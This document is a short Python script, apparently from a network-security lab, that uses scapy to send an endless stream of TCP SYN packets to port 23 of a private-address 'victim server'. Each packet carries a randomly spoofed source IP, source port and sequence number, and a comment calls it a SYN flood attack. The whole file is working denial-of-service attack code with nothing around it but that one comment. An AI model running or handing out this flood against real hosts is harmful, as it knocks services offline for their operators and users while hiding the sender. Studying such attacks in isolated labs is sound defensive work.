from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

V_IP = '10.9.0.5'

ip = IP(dst=V_IP)
tcp = TCP(dport=23, flags='S')
pkt = ip/tcp

# SYN flood attack will create a lot half-opened connection to victim server from generated random IP address
while True:
  pkt[IP].src = str(IPv4Address(getrandbits(32)))
  pkt[TCP].sport = getrandbits(16)
  pkt[TCP].seq = getrandbits(32)
  send(pkt, verbose=0)

